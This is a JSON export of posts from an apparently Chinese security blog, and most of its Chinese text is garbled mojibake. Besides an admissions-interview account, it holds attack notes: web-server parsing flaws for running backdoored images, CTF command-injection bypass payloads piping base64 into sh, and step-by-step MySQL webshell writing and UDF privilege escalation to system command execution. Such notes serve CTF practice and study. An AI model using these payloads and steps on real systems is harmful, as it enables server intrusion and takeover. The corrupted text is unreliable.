å’Œç¾èµ›ç»å†ï¼Œé‡ç‚¹é—®äº†ç¾èµ›é‡Œé¢æˆ‘æ‰¿æ‹…çš„å·¥ä½œï¼Œå¹¶é—®äº†ä¸»è¦æ˜¯è°ç¿»è¯‘çš„ã€‚ æœ€åè€ƒæ ¸ç»“æœå¤ä»¤è¥å½•å–åé¢ç½‘å®‰ä¸º10ä¸ªï¼Œæˆ‘æ’ç¬¬äºŒï¼Œå…é¢„æ¨å…å¤è¯•ã€‚ ä¸­å¤®è´¢ç»å¤§å­¦ ä¿¡æ¯å­¦é™¢æ²¡å»é¢è¯• è¥¿åŒ—å·¥ä¸šå¤§å­¦ ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢æ²¡å»é¢è¯• é¢„æ¨å…é¢ç»é¢„æ¨å…çš„baræ˜æ˜¾ä½äº†ä¸å°‘ã€‚ ç”µå­ç§‘æŠ€å¤§å­¦ å¯¼å¸ˆé¢è¯•ç”µå­ç§‘æŠ€å¤§å­¦åœ¨ä¸ƒæœˆä¸‹æ—¬æå‰è”ç³»å¯¼å¸ˆï¼Œå‚åŠ äº†å¯¼å¸ˆå›¢é˜Ÿé¢è¯•ã€‚ä¸€å…±å¤§æ¦‚ä¸‰å››ä½è€å¸ˆï¼Œé¦–å…ˆç”¨ä¸­æ–‡ç®€å•åœ°ä»‹ç»äº†è‡ªå·±ï¼Œé—®æˆ‘çš„é¡¹ç›®å†™äº†å¤šå°‘è¡Œä»£ç ï¼Œæ˜¯ä¸æ˜¯è‡ªå·±å†™çš„ï¼Œé—®æˆ‘çš„æ‰«æå™¨èƒ½å¦åœ¨æ‰«æé€Ÿåº¦å¾ˆå¿«çš„æƒ…å†µä¸‹æ‰«æå®Œæ‰€æœ‰ç›®æ ‡URLï¼Œé—®ZOOMEYE\\FOFA\\SHODANç­‰ç©ºé—´æµ‹ç»˜å¼•æ“çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼ˆä¸»è¦çœ‹ç€ç®€å†é—®ï¼‰ï¼Œé—®äº†é—®æˆ‘ç¾èµ›çš„è·å¥–æ¯”ä¾‹ä»¥åŠè´Ÿè´£çš„å·¥ä½œã€‚æœ€åé—®äº†æˆ‘æ ¡æ˜¯å¦985211ï¼Œæ•°å°æ—¶åè¢«é€šçŸ¥é€šè¿‡å›¢é˜Ÿé¢è¯•ï¼Œç»è¿‡å­¦é™¢é¢è¯•åå¯ç›´æ¥æŠ¥è€å¸ˆã€‚ å¤©æ´¥å¤§å­¦ æ™ºèƒ½ä¸è®¡ç®—å­¦éƒ¨å¤©å¤§æˆ‘å…ˆè”ç³»äº†ä¸€ä½è€å¸ˆï¼Œè¿™ä½è€å¸ˆçš„ç ”ç©¶æ–¹å‘å’Œæˆ‘éå¸¸ç¬¦åˆï¼Œè€å¸ˆä¹Ÿå¾ˆæ˜ç¡®åœ°æƒ³è¦æˆ‘ï¼Œä½†æ˜¯å¤ä»¤è¥å¡985211ï¼Œæ‰€ä»¥æˆ‘æ²¡è¿›å»ï¼Œç­‰é¢„æ¨å…æ‰è¿›å»çš„ã€‚ é¢è¯•é¦–å…ˆæ˜¯ä¸€åˆ†é’Ÿçš„è‹±æ–‡è‡ªæˆ‘ä»‹ç»ï¼Œä»‹ç»è¿‡åè®²ä¸€ä¸‹è‡ªå·±å‡†å¤‡çš„PPTï¼ˆå¯ä»¥ä¸­æ–‡å†ä»‹ç»ä¸€ä¸‹ï¼‰ç„¶åè®²ä¸€ä¸ªä½ è®¤ä¸ºæœ€é‡è¦çš„é¡¹ç›®ï¼ˆæˆ‘å½“æ—¶å¬é”™äº†ï¼Œæˆ‘ä»¥ä¸ºæ˜¯ä¸é™ç§‘ç ”ç»å†ï¼Œåªé™ä¸€ä¸ªé¡¹ç›®ï¼Œæ‰€ä»¥æˆ‘ä¸€å…±è®²äº†ä¸‰ä¸ªï¼Œé¢è¯•è€å¸ˆæœ‰äº›ä¸å¤ªé«˜å…´ï¼‰ï¼Œæœ€åé—®äº†é—®æˆ‘çš„è®ºæ–‡æ˜¯æ€ä¹ˆå†™çš„ï¼Œåˆ›æ–°ç‚¹åœ¨å“ªé‡Œã€‚ç»“æŸé¢è¯• æœ€åç»™äº†ç½‘å®‰å­¦ç¡•ï¼Œéå¸¸éå¸¸æ„Ÿè°¢è®¸è€å¸ˆã€‚ å±±ä¸œå¤§å­¦ ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢å’Œè€å¸ˆè”ç³»è¿‡åæˆ‘è§‰å¾—å»å±±å¤§ä¸“ç¡•è¿˜æ˜¯æ¯”è¾ƒæœ‰å¸Œæœ›çš„ï¼Œäºæ˜¯æŠ¥äº†å±±å¤§çš„é¢„æ¨å…ï¼Œæ¯”è¾ƒæ™šï¼Œé¢è¯•åœ¨8å·ã€‚ é¢è¯•é¦–å…ˆæ˜¯ä¸€è½®æ‹·é—®ï¼Œè¿˜æ˜¯é—®æˆ‘ç¾èµ›è´Ÿè´£çš„å·¥ä½œã€é—®æˆ‘æœ¬ç§‘åšä»€ä¹ˆæ–¹å‘ï¼Œè¯´æˆ‘æœ¬ç§‘æ‰“webï¼Œç ”ç©¶ç”Ÿæ–¹å‘ä¸å¤ªä¸€æ ·ã€‚ç„¶åæœ‰ä¸ªè€å¸ˆç”¨è‹±æ–‡è®©æˆ‘æè¿°ä¸€ä¸‹æˆ‘çš„æ•°æ®å¯è§†åŒ–é¡¹ç›®ï¼Œè¿˜æœ‰ä¸€ä½è€å¸ˆé—®äº†KASLRçš„ä½œç”¨ä»¥åŠåŸç†ã€‚ã€‚åŸç†æ²¡è¯´ä¸Šæ¥ï¼Œè¿˜æ˜¯è¿™ä½è€å¸ˆï¼Œé—®äº†æˆ‘çš„è®ºæ–‡åˆ›æ–°ç‚¹åœ¨å“ªé‡Œï¼Œæœ‰æ²¡æœ‰è‡ªå·±çš„æ–°ä¸œè¥¿â€¦.ä¸€é’ˆè§è¡€ã€‚ã€‚æœç„¶ä¸ä¸€èˆ¬ã€‚ æœ€åæƒ³ç€èƒ½æœ‰ä¸“ç¡•å°±è¡Œäº†ï¼Œç»“æœè€å¸ˆå¸®æˆ‘é€’è¡¥äº†å­¦ç¡•ï¼Œæ„Ÿè°¢sduï¼Œæ„Ÿè°¢éƒ­è€å¸ˆã€‚ ç”µå­ç§‘æŠ€å¤§å­¦ è®¡ç®—æœºç§‘å­¦ä¸å·¥ç¨‹å­¦é™¢UESTCæ˜¯æˆ‘æœ€åä¸€æˆ˜ï¼Œéå¸¸ç´§å¼ ã€‚ é¢è¯•é¦–å…ˆæ˜¯ä¸‰åˆ†é’Ÿçš„PPTè‡ªæˆ‘ä»‹ç»ï¼Œä»‹ç»äº†å­¦æœ¯èƒŒæ™¯ã€ç§‘ç ”ç»å†ã€é¡¹ç›®ç»å†ã€‚ ç„¶åæ˜¯æŠ½é¢˜ ï¼ŒæŠ½åˆ°çš„é¢˜æ˜¯æè¿°ç®—æ³•ï¼Œå¦‚ä½•æ‰¾å‡ºä¸¤ä¸ªstirngçš„å…¬å…±å­—ç¬¦ã€‚ æ¥ä¸‹æ¥æ˜¯è‹±æ–‡é—®é¢˜ï¼Œdescribe a project å’Œ why choose our school? éƒ½æ¯”è¾ƒç®€å•ï¼Œè€è€ƒç‚¹äº†ã€‚ ä¸‹é¢å°±å¼€å§‹æ‹·é—®äº†ï¼Œä¸“ä¸šçŸ¥è¯†é—®äº†è½¯ä»¶æµ‹è¯•çš„å››ä¸ªè¿‡ç¨‹ï¼Œé»‘ç›’æµ‹è¯•å’Œç™½ç›’æµ‹è¯•çš„åŒºåˆ«ï¼Œå› ä¸ºæˆ‘æœ¬ç§‘æ˜¯è½¯ä»¶å·¥ç¨‹ï¼Œé—®æˆ‘å‡­ä»€ä¹ˆæŠ¥ä¿¡æ¯å®‰å…¨ï¼ˆï¼Ÿï¼‰æˆ‘è¯´æˆ‘è‡ªå·±æœ¬ç§‘ä¸»åŠ¨å­¦ä¹ ç›¸å…³çŸ¥è¯†ç­‰ã€‚ å®‰å…¨å¼€å‘çš„ç»å†ã€è¿™ä¸ªçŸ­æœŸå®ä¹ ä½ è§‰å¾—ä½ éƒ½æ”¶è·äº†ä»€ä¹ˆä¸œè¥¿ï¼Ÿ ç¾èµ›ä¸»è¦è´Ÿè´£å“ªäº›å†…å®¹ï¼Ÿ æ¥ä¸‹æ¥è€å¸ˆé—®æˆ‘æ›´åå‘çº¯æŠ€æœ¯è¿˜æ˜¯éƒ¨åˆ†æŠ€æœ¯+socialï¼Œæˆ‘é€‰æ‹©äº†å‰è€…ã€‚ æœ€åè€å¸ˆé—®æˆ‘ç›®å‰çš„ä¸»æ”»æ–¹å‘æ˜¯ä»€ä¹ˆï¼Œæˆ‘BBäº†ä¸€å †æ‰“å¤ªæï¼Œæœ€åè€å¸ˆåˆé—®ï¼Œæˆ‘ç ´é˜²äº†ï¼Œé‚è¯´Webå®‰å…¨/æ¸—é€æµ‹è¯•ã€‚ æ€»ç»“ä¿ç ”æ—¢æœ‰å®åŠ›ä¹Ÿæœ‰è¿æ°”ï¼Œç¥å¤§å®¶å¥½è¿ã€‚ ä¸èƒ½ä¿è¯å¥½è¿çš„å‰æä¸‹è¯·å°½é‡æå‡è‡ªæˆ‘ï¼Œå› ä¸ºåœ¨é¢è¯•ä¸­ä¸ä¸€å®šä¼šé‡åˆ°ä»€ä¹ˆé—®é¢˜ï¼Œè¯·å®Œå–„ç®€å†ï¼ŒåŠ¡å¿…å¯¹ç®€å†ä¸Šçš„æ¯ä¸€ä¸ªé—®é¢˜éƒ½ç†Ÿæ‚‰ã€‚ å½“ä½ è§‰å¾—æ™šäº†çš„æ—¶å€™å¼€å§‹ï¼Œæ°æ°æ˜¯æœ€æ—©çš„æ—¶å€™ï¼Œç°åœ¨å¼€å§‹ï¼Œä¸€åˆ‡ä¸æ™šã€‚ å­¦ä¼šç¤¾äº¤ï¼Œå­¦ä¼šé—®é—®é¢˜ï¼Œå­¦ä¼šå’Œè€å¸ˆæ²Ÿé€šäº¤æµï¼Œå†³å®šé¸½çš„æ—¶å€™è¦å°½é‡å°½æ—©ï¼Œå°±ç®—ä¸èƒ½æ—©é¸½ä¹Ÿä¸€å®šæå‰å’Œè€å¸ˆè¯´æ˜æƒ…å†µï¼Œå¤§å¤šæ•°è€å¸ˆä¼šç†è§£ã€‚ä¸€å®šå¤„ç†å¥½å’Œå­¦æ ¡çš„å…³ç³»ï¼Œè¿™ä¸ä»…å…³ä¹ä½ ï¼Œæ›´å…³ä¹ä½ çš„å­¦å¼Ÿå­¦å¦¹ã€‚ è”ç³»æ–¹å¼ä¸ªäººVX:ab444o æ¬¢è¿å¸ˆå¼Ÿå¸ˆå¦¹äº¤æµä¿ç ”ç›¸å…³é—®é¢˜~","categories":[],"tags":[]},{"title":"è§£ææ¼æ´å°ç»“","slug":"è§£ææ¼æ´å°ç»“","date":"2020-06-20T14:49:06.000Z","updated":"2020-06-20T15:14:07.769Z","comments":true,"path":"2020/06/20/è§£ææ¼æ´å°ç»“/","link":"","permalink":"https://polosec.github.io/2020/06/20/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/","excerpt":"","text":"å‚è€ƒé“¾æ¥:https://www.jianshu.com/p/a1fa305a6b8f IIS5/6è§£ææ¼æ´ç›®å½•è§£æ:åœ¨ç½‘ç«™ä¸‹å»ºç«‹æ–‡ä»¶å¤¹çš„åç§°ä¸­å¸¦æœ‰.aspã€.asaç­‰å¯æ‰§è¡Œè„šæœ¬æ–‡ä»¶åç¼€ä¸ºåç¼€çš„æ–‡ä»¶å¤¹ï¼Œå…¶ç›®å½•å†…çš„ä»»ä½•æ‰©å±•åçš„æ–‡ä»¶éƒ½è¢«IISå½“ä½œå¯æ‰§è¡Œæ–‡ä»¶æ¥è§£æå¹¶æ‰§è¡Œã€‚æ¯”å¦‚ www.baidu.com/1.asp/1.jpgæ–‡ä»¶è§£æ:åœ¨IIS6.0ä¸‹ï¼Œåˆ†å·åé¢çš„ä¸è¢«è§£æï¼Œä¹Ÿå°±æ˜¯è¯´6.0ä¸‹ï¼Œåˆ†å·åé¢çš„ä¸è¢«è§£æï¼Œä¹Ÿå°±æ˜¯è¯´xx.asp;.jpgå°†è¢«å½“åšxx.aspè§£æå¹¶æ‰§è¡Œã€‚http://www.xxx.com/xx.asp;.jpgIIS6.0 é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶æœ‰aspã€asaã€cerã€cdxå››ç§ã€‚ IIS 7.0/IIS 7.5/ Nginx &lt;0.8.3ç•¸å½¢è§£ææ¼æ´åœ¨é»˜è®¤Fast-CGIå¼€å¯çŠ¶å†µä¸‹,åœ¨ä¸€ä¸ªæ–‡ä»¶è·¯å¾„(/xx.jpg)åé¢åŠ ä¸Š/xx.PHPä¼šå°† /xx.jpg/xx.php è§£æä¸º php æ–‡ä»¶ã€‚å¸¸ç”¨åˆ©ç”¨æ–¹æ³•ï¼š å°†ä¸€å¼ å›¾å’Œä¸€ä¸ªå†™å…¥åé—¨ä»£ç çš„æ–‡æœ¬æ–‡ä»¶åˆå¹¶ å°†æ¶æ„æ–‡æœ¬å†™å…¥å›¾ç‰‡çš„äºŒè¿›åˆ¶ä»£ç ä¹‹åï¼Œé¿å…ç ´åå›¾ç‰‡æ–‡ä»¶å¤´å’Œå°¾ Nginx &lt;=0.8.37 è§£ææ¼æ´00æˆªæ–­åœ¨Fast-CGIå…³é—­çš„æƒ…å†µä¸‹ï¼ŒNginx &lt;=0.8.37 ä¾ç„¶å­˜åœ¨è§£ææ¼æ´åœ¨ä¸€ä¸ªæ–‡ä»¶è·¯å¾„(/xx.jpg)åé¢åŠ ä¸Š%00.phpä¼šå°† /xx.jpg%00.php è§£æä¸º php æ–‡ä»¶ã€‚ Apache è§£ææ¼æ´åç¼€è§£æï¼štest.php.x1.x2.x3Apacheå°†ä»å³è‡³å·¦å¼€å§‹åˆ¤æ–­åç¼€ï¼Œè‹¥x3éå¯è¯†åˆ«åç¼€ï¼Œå†åˆ¤æ–­x2ï¼Œç›´åˆ°æ‰¾åˆ°å¯è¯†åˆ«åç¼€ä¸ºæ­¢ï¼Œç„¶åå°†è¯¥å¯è¯†åˆ«åç¼€è¿›è§£ætest.php.x1.x2.x3 åˆ™ä¼šè¢«è§£æä¸ºphp","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"å‘½ä»¤æ‰§è¡Œç»•è¿‡(ping ping ping)","slug":"ping-ping-ping","date":"2020-06-20T13:14:50.000Z","updated":"2020-06-20T13:37:33.955Z","comments":true,"path":"2020/06/20/ping-ping-ping/","link":"","permalink":"https://polosec.github.io/2020/06/20/ping-ping-ping/","excerpt":"","text":"é¡µé¢ç»™äº†ä¸ªipï¼Œè€ƒè™‘pingå‘½ä»¤çš„å‘½ä»¤æ‰§è¡Œã€‚è¿™é‡Œè¿‡æ»¤çš„å†…å®¹æ¯”è¾ƒå¤šï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œè€Œä¸”æœ‰äº›ç©ºæ ¼ç»•è¿‡æ–¹æ³•ä¹Ÿç”¨ä¸äº†ã€‚è¿™é‡Œç»•è¿‡ç©ºæ ¼ç”¨çš„æ˜¯$IFS$9æ¥ä¸‹æ¥å°è¯•cat flagflagå­—æ®µä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå°è¯•ä½¿ç”¨é€šé…ç¬¦ä¹Ÿä¸è¡Œï¼Œ*ä¹Ÿä¸è¡Œï¼Œ[]ç¬¦å·ä¹Ÿè¢«è¿‡æ»¤äº†ã€‚æ¥ä¸‹æ¥å°è¯•base64ç¼–ç ã€‚echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh å¯è¡Œè¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯cat åå¼•å·é‡Œé¢çš„å†…å®¹--- æˆ–$() ä¼šå¼•ç”¨å‘½ä»¤è¢«æ‰§è¡Œåçš„ç»“æœã€‚?ip=127.0.0.1;cat$IFS$9lsè¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯æ‹¼æ¥ï¼š?ip=127.0.0.1;a=g;cat$IFS$9fla$a.phpè¿™æ ·ä¹Ÿå¯ä»¥ç»•è¿‡ã€‚è¡¥å……ç©ºæ ¼ç»•è¿‡ï¼š{cat,1.txt}å…³é”®å­—è¿‡æ»¤ç»•è¿‡ï¼šåæ–œæ  ca\\tã€å˜é‡ä»£æ¢ã€ç¼–ç ã€ echo xxxx | base64 -d|sh/bashã€å¼•å·câ€™aâ€™tå‘½ä»¤åˆ†éš”ä¸æ‰§è¡Œå¤šæ¡å‘½ä»¤1.&amp;&amp; è¡¨ç¤ºå°†ä»»åŠ¡ç½®äºåå°æ‰§è¡Œ2.&amp;&amp;åªæœ‰åœ¨ &amp;&amp; å·¦è¾¹çš„å‘½ä»¤è¿”å›çœŸï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 0ï¼‰ï¼Œ&amp;&amp; å³è¾¹çš„å‘½ä»¤æ‰ ä¼šè¢«æ‰§è¡Œã€‚3.|| è¡¨ç¤ºç®¡é“ï¼Œä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤çš„å‚æ•°4.||åªæœ‰åœ¨ || å·¦è¾¹çš„å‘½ä»¤è¿”å›å‡ï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 1ï¼‰ï¼Œ|| å³è¾¹çš„å‘½ä»¤æ‰ ä¼šè¢«æ‰§è¡Œã€‚5.ï¼›å¤šè¡Œè¯­å¥ç”¨æ¢è¡ŒåŒºåˆ†ä»£ç å¿«ï¼Œå•è¡Œè¯­å¥ä¸€èˆ¬è¦ç”¨åˆ°åˆ†å·æ¥åŒºåˆ†ä»£ç å—","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"https://polosec.github.io/tags/ctf/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"}]},{"title":"é¢è¯•é—®é¢˜æ•´ç†","slug":"é¢è¯•é—®é¢˜æ•´ç†","date":"2020-06-19T15:16:01.000Z","updated":"2020-06-20T10:53:47.876Z","comments":true,"path":"2020/06/19/é¢è¯•é—®é¢˜æ•´ç†/","link":"","permalink":"https://polosec.github.io/2020/06/19/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/","excerpt":"","text":"æœ¬æ–‡ä¸é—´æ–­åœ°è®°å½•é¢è¯•é‡åˆ°çš„é—®é¢˜ï¼Œå¸Œæœ›èƒ½å¯¹è‡ªå·±æœ‰ä¸ªè­¦é†’ï¼Œå¯¹åè¾ˆæœ‰æ‰€ä½œç”¨ã€‚ MySQLå†™Webshellçš„æ¡ä»¶1.çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„2.æœ‰å¯¹ç½‘ç«™ç»å¯¹è·¯å¾„çš„å†™æƒé™ select @@basedir;3.æ²¡æœ‰é…ç½®secure_file_priv æˆ–è€…å…¶ä¸ºç©º4.GPCå…³é—­ï¼ˆé»˜è®¤å…³é—­ï¼‰secure_file_privå·²ç»è®¾ç½®çš„è¯ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹æ—¥å¿—æ–‡ä»¶åˆ°ç½‘ç«™æ ¹ç›®å½•ï¼Œç„¶åé€šè¿‡åŒ…å«çš„æ–¹å¼å†™shellæµç¨‹ï¼šé¦–å…ˆæ‰¾åˆ°æ—¥å¿—å­˜æ”¾ä½ç½®ï¼šæ¥ä¸‹æ¥è®¾ç½®general_log ä¸ºonï¼šset global general_log = on;æ¥ä¸‹æ¥æŠŠæ—¥å¿—æ–‡ä»¶ä¿®æ”¹ä¸ºç½‘ç«™ç»å¯¹ç›®å½•ä¸‹çš„æŸä¸ªæ–‡ä»¶ æ¯”å¦‚set global general_log_file =â€™/var/www/html/shell.phpâ€™;æ¥ä¸‹æ¥select å³å¯è®°å½•åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œåœ¨URLä¸­è®¿é—®æ—¥å¿—æ–‡ä»¶å³å¯ã€‚è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœç›®æ ‡ç«™ç‚¹æ•°æ®åº“è®¿é—®é¢‘ç¹çš„è¯å¯èƒ½æ—¥å¿—æ–‡ä»¶ä¼šå¾ˆå¤§ï¼Œè¿shellä¼šå¾ˆå¡ï¼Œæ‰€ä»¥æ‹¿åˆ°è¯¥shellåé‡æ–°å†ä¼ ä¸€ä¸ªéšè”½ç‚¹çš„shellï¼Œå†æŠŠæ—¥å¿—æ–‡ä»¶æ”¹å›å»ï¼Œå…³é—­æ—¥å¿—è®°å½•çš„åŠŸèƒ½ã€‚ mysqlå¸¸ç”¨æŸ¥è¯¢select @@version; æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬select @@basedir; æŸ¥è¯¢MYSQLå®‰è£…è·¯å¾„select @@plugin_dir ; æŸ¥çœ‹pluginè·¯å¾„select host, user, password from mysql.user; æŸ¥è¯¢hash (MySQL &lt;= 5.6 )select host, user, authentication_string from mysql.user; æŸ¥è¯¢hash (MySQL &gt;= 5.7 )select @@version_compile_os,@@version_compile_machine; æŸ¥è¯¢å½“å‰æ“ä½œç³»ç»Ÿ å†™shellçš„å‡ ç§æ–¹å¼Union selectunion select â€˜â€˜ into outfile /var/www/html/shell.php# lines terminated byselect * from phpcmsv9.v9_admin_role where roleid = 1 into outfile â€˜C:/wamp64/www/work/webshell.phpâ€™ lines terminated by â€˜â€˜;åŸç†ï¼šé€šè¿‡selectè¯­å¥æŸ¥è¯¢çš„å†…å®¹å†™å…¥æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ 1 into outfile â€˜C:/wamp64/www/work/webshell.phpâ€™ è¿™æ ·å†™çš„åŸå› ï¼Œç„¶ååˆ©ç”¨ lines terminated by è¯­å¥æ‹¼æ¥webshellçš„å†…å®¹ã€‚lines terminated by å¯ä»¥ç†è§£ä¸º ä»¥æ¯è¡Œç»ˆæ­¢çš„ä½ç½®æ·»åŠ  xx å†…å®¹ã€‚ lines starting byç±»ä¼¼lines terminated by fields terminated byåˆ©ç”¨ fields terminated by è¯­å¥æ‹¼æ¥webshellçš„å†…å®¹ã€‚fields terminated by å¯ä»¥ç†è§£ä¸º ä»¥æ¯ä¸ªå­—æ®µçš„ä½ç½®æ·»åŠ  xx å†…å®¹ã€‚ columns terminated byå¦‚ä¸ŠåŒç† sqlmapå†™webshellç±»ä¼¼ä¸Šè¿°Mysqlå†™webshellï¼Œä¸è¿‡æ›´è‡ªåŠ¨åŒ–äº†ï¼Œä½¿ç”¨å‘½ä»¤ä¸º mysql -u url â€“os-shellï¼Œè¦æ±‚åŒä¸Šâ€“ç›®å½•å¯å†™ï¼Œå…³é—­gpcï¼Œç»å¯¹è·¯å¾„ï¼Œban secure_file_priv mysql UDFææƒå‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/qq_26406447/article/details/102691188https://www.jianshu.com/p/5b34c1b6dee7ä»€ä¹ˆæ˜¯UDFï¼ŸUDFï¼ˆuser defined functionï¼‰ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œæ˜¯mysqlçš„ä¸€ä¸ªæ‹“å±•æ¥å£ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡è‡ªå®šä¹‰å‡½æ•°å®ç°åœ¨mysqlä¸­æ— æ³•æ–¹ä¾¿å®ç°çš„åŠŸèƒ½ï¼Œå…¶æ·»åŠ çš„æ–°å‡½æ•°éƒ½å¯ä»¥åœ¨sqlè¯­å¥ä¸­è°ƒç”¨ï¼Œå°±åƒè°ƒç”¨æœ¬æœºå‡½æ•°ä¸€æ ·ã€‚é€šè¿‡åŠ¨æ€åº“æ–¹å¼å®ç°é¦–å…ˆé€šè¿‡æ³¨å…¥è·å–mysqlè´¦å·å¯†ç  1234&#x2F;&#x2F;MySQL 5.6 and belowselect host, user, password from mysql.user;&#x2F;&#x2F;MySQL 5.7 and aboveselect host, user, authentication_string from mysql.user; æœ‰åˆ—æ•°é™åˆ¶çš„è¯å°±group_concat(c1,c2,c3 separator â€˜-â€˜)æ‹¿åˆ°å¯†ç åå»æœä¸€ä¸‹md5å€¼ã€‚ã€‚è¿™é‡Œé»˜è®¤root rootç„¶åè¿œç¨‹è¿æ¥mysqlçœ‹ä¸€ä¸‹secure_file_privæ¥ä¸‹æ¥å°±æŠŠå¯¹åº”mysqlç‰ˆæœ¬çš„dllæ–‡ä»¶ä¼ ä¸Šå» ä½æ•°æŸ¥çœ‹å‘½ä»¤ï¼šshow variables like â€˜%version_%â€™ï¼›ï¼Œä½æ•°ä¸å¯¹ä½¿ç”¨dllæ–‡ä»¶çš„æ—¶å€™ä¼šæŠ¥é”™ï¼ï¼ï¼ä¸€å®šæ³¨æ„æˆ‘è¿™é‡Œæ˜¯64ä½ï¼Œå°±ä¼ 64ä½çš„äº†ï¼Œä¼ ä¹‹å‰éœ€è¦ç”¨sqlmapçš„dllï¼Œä½†æ˜¯å¼‚æˆ–ç¼–ç ï¼Œéœ€è¦è§£ç ï¼Œè§£ç ä¹Ÿåœ¨sqlmapé‡Œé¢ã€‚python cloak.py -d -i â€¦/64/lib_mysqludf_sys.dll_è§£ç åä¸Šä¼ åˆ°æ•°æ®åº“å¯¹åº”çš„ä½ç½®é‡Œé¢å»è¿™é‡Œæˆ‘ä¸Šä¼ å‡ºäº†ç‚¹é—®é¢˜ï¼Œå¤ªç¦»è°±äº†ã€‚æˆ‘ä¸å¤ªä¼šç”¨loadfileï¼Œæ‰€ä»¥æŠŠæ–‡ä»¶é€šè¿‡010editorï¼Œè½¬ä¸º16è¿›åˆ¶å¯¼å‡ºï¼Œç„¶ååœ¨notepadå»æ‰ç©ºæ ¼å’Œæ¢è¡Œç¬¦(åŒ¹é…â€™\\r\\nâ€™),ç„¶åselect unhex(â€˜dataâ€™) into dumpfile â€˜path/plugin/udf.dllâ€™æ¥ä¸‹æ¥ï¼Œcreate function sys_eval returns string soname â€œudf.dllâ€;ä¹‹åå°±å¯ä»¥æ„‰å¿«åœ°åœ¨mysqlé‡Œé¢ä½¿ç”¨ç³»ç»Ÿæƒé™æ‰§è¡Œå‘½ä»¤äº†ã€‚","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"apacheã€nginxã€iisæ—¥å¿—æµ…æ","slug":"æ—¥å¿—æµ…æ","date":"2020-06-17T14:18:25.000Z","updated":"2020-06-17T15:49:23.527Z","comments":true,"path":"2020/06/17/æ—¥å¿—æµ…æ/","link":"","permalink":"https://polosec.github.io/2020/06/17/%E6%97%A5%E5%BF%97%E6%B5%85%E6%9E%90/","excerpt":"","text":"å°çŸ¥è¯†ï¼šå¸¸è§çš„Linuxå‘è¡Œç‰ˆæœ¬ï¼šRedhatã€Ubuntuã€CentOSã€SuSEã€Gentooã€Debianã€Fedoraã€æœ€è¿‘hwé¢è¯•é—®åˆ°çš„é—®é¢˜ï¼Œç‰¹åœ°æ•´ç†ä¸€ä¸‹ã€‚ Findå‘½ä»¤é¢è¯•é‡Œé¢é—®æˆ‘æ€ä¹ˆç”¨findå‘½ä»¤æ‰¾nginxçš„æ—¥å¿—æ–‡ä»¶ï¼ˆå…ˆé—®çš„æˆ‘nginxçš„æ—¥å¿—æ–‡ä»¶å«å•¥ã€‚ã€‚æˆ‘ä¸çŸ¥é“ã€‚ã€‚å°´å°¬ï¼‰ç„¶åæç¤ºæˆ‘æ˜¯.logç»“å°¾ï¼Œç„¶åæˆ‘å°±è¯´äº†find / -name â€œ.logâ€ æ²¡æƒ³åˆ°å®³è’™å¯¹äº†â€¦ å‡†ç¡®çš„è¡¨è¿°åº”è¯¥æ˜¯ find /var/log/nginx -name â€œ.logâ€è¿™é‡Œè¯´ä¸€ä¸‹findå‘½ä»¤çš„ä¸€äº›ç”¨æ³•ã€‚-exec/-okéƒ½æ˜¯æ‰§è¡Œå‘½ä»¤ï¼Œä¸è¿‡-okä¼šå…ˆç»™å‡ºæç¤ºï¼Œè®©ç”¨æˆ·ç¡®å®šæ˜¯å¦æ‰§è¡Œã€‚find . -perm 777 -exec ls -l {} ;-perm æ˜¯æŒ‰ç…§æƒé™è¿›è¡ŒæŸ¥æ‰¾æ¯”å¦‚ find / -perm 777 Linuxæƒé™é¡ºä¾¿è¯´ä¸€ä¸‹Linuxæƒé™é—®é¢˜RWX read-write-executeå¯¹åº”æƒå€¼ä¸º4-2-1æ‰€ä»¥chmod 777çš„æ„æ€å°±æ˜¯è¯´ç»™æ‰€æœ‰çš„ç”¨æˆ·å¯è¯»å¯å†™å¯æ‰§è¡Œçš„æƒé™ï¼ˆå±é™©æ¯ä¸ª7åˆ†åˆ«å¯¹åº”Userã€Groupã€Otherçš„æƒé™ã€‚ Apcheã€Nginxã€IISæ—¥å¿—Apache:centosé…ç½®æ–‡ä»¶ï¼š/etc/httpd/conf/httpd.confUbuntué…ç½®æ–‡ä»¶ï¼š/etc/apache2/apache2.confæ—¥å¿—æ–‡ä»¶çš„é…ç½®åœ¨httpd.confä¸­ã€‚apacheæ—¥å¿—è®°å½•äº†å®¢æˆ·ç«¯ipã€æ—¶é—´ã€æ–¹æ³•ã€è¯·æ±‚èµ„æºã€status codeã€content lengthç­‰ä¿¡æ¯ã€‚Windowså¹³å°çš„æ—¥å¿—ä½ç½®é»˜è®¤åœ¨apache/logs/access.log 